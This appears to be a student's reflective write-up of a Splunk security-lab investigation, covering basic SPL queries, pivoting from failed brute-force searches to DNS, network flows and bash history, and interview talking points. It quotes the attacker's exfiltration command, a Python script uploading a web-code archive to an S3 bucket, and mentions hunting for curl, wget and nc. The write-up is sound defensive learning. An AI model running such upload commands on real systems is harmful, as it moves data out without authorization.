# What I Learned - Lessons That Actually Matter

## Splunk Fundamentals

The foundation of everything in Splunk is `stats count by field`. Seriously.

Most analysis comes down to:
- Count events and group by field
- Sum bytes and group by IP
- Look for anomalies (a field that has way more of something than expected)

Once you understand that one concept, you can adapt it to almost any question. `stats sum(bytes_out) by src_ip` shows you who's uploading. `stats count by error_code` shows you common errors. `stats count by username` shows you who's logged in.

The syntax changes but the idea is always the same: aggregate data and look for patterns.

## Investigation Process

My process was:
1. Don't know what to search for? Search for common attack patterns first.
2. Result comes back empty? That teaches you something - the attack happened differently.
3. Pivot based on what you learned.
4. When one angle isn't working, follow a different trail.

I started with "did they brute-force?" Got empty results. That meant they got in another way. So I looked at what they were scouting (DNS). Found database scanning. That led to "did they steal database data?" That led to network exfil. That led to "what command did they run?" That led to bash history and the smoking gun.

Each dead end pointed me toward the next clue.

## Query Construction

I used:
- `stats count by field` to find patterns
- `sort - field` to see highest values first
- `table` to display the raw data I cared about
- Filtering by exact values (src_ip=specific_ip) to narrow down

I didn't use fancy regex or complex SPL. Just these basic building blocks. They were enough.

## When Something Doesn't Work

When I tried to search using ISO 8601 timestamps (2018-08-20T09:43:00) the query died. Older Splunk doesn't support that format.

That taught me: test your syntax with small queries first. Don't assume the syntax from the documentation will work in this specific Splunk version.

When I searched for curl/wget/nc and found nothing, that taught me: the lack of a tool is also evidence. It told me the attacker used a custom tool, which is actually more sophisticated than using standard utilities.

## What's Really Hard About SOC Work

It's not knowing Splunk syntax. Anyone can learn that.

It's:
- Knowing what to search for when you don't know what happened
- Interpreting results when they're weird or unexpected
- Staying patient through dead ends
- Asking good questions
- Connecting dots across different data sources

This investigation took me through DNS, network flows, process monitoring, and bash history. I had to understand what each meant and how they connected. That's the hard part.

## What Stands Out

The moment I found the bash history command:

```
python /home/ec2-user/tools/s3-upload.py --bucket frothlywebcode --file frothly_html_memcaced.tar.gz
```

That's when I knew I had it. That's the proof. That's not a log entry that could be misinterpreted. That's the actual command someone typed.

That's what I'd look for if I was a real SOC analyst - not just "suspicious activity" but "actual evidence."

## Interview Prep

If someone asks me "walk me through this investigation":

"I started with 2 million events and no idea what happened. My first instinct was they brute-forced their way in, so I looked for failed login attempts on Windows. Found nothing - that meant they got in a different way. So I pivoted to what they would do first - scout the network. Found massive DNS queries to AWS database endpoints - that's reconnaissance. Then I checked network flows for large data transfers. Found 31+ MB leaving the network in 2 minutes - that's exfiltration. Got the timestamp and searched for what was running at that time. Found a custom Python script uploading files to S3. Found the exact command in bash history. The attacker's machine, the exact time, the exact command - everything."

"The key insight was that when one approach didn't work (brute force), I didn't give up - I asked 'OK so what WOULD they do instead?' and followed the evidence."

## The Real Skill

It's not memorizing SPL queries. It's thinking like a detective.

- What would an attacker do first?
- What would leave evidence?
- If I don't find evidence of X, what does that tell me about how the attack happened?
- Where is the smoking gun?

You need to know Splunk syntax, sure. But more importantly you need to be able to ask the right questions, follow evidence, and connect dots.

## What I'd Tell Myself at the Beginning

Don't overthink this. Start simple. Ask basic questions. Follow where the data leads. When something doesn't make sense, that's your clue that you're missing something.

And always check bash history. Attackers forget that logs everything they type. It's like catching someone on video.

## Skills I Actually Improved

- SPL query construction
- Thinking through attack methodology
- Following evidence trails
- Understanding network vs process vs log data
- Reading raw event data and interpreting what it means
- Persistence (not giving up on queries that return empty)

This wasn't like following a tutorial where someone tells you exactly what to search for. I had to figure it out. That's the real learning.

## Final Thought

The goal of being a SOC analyst isn't to run queries perfectly. It's to hunt attackers. Splunk is just a tool.

This investigation showed me that hunting is more like detective work than coding. It's pattern recognition, logical deduction, and following clues.

And knowing how to do that is worth way more than knowing every SPL command.
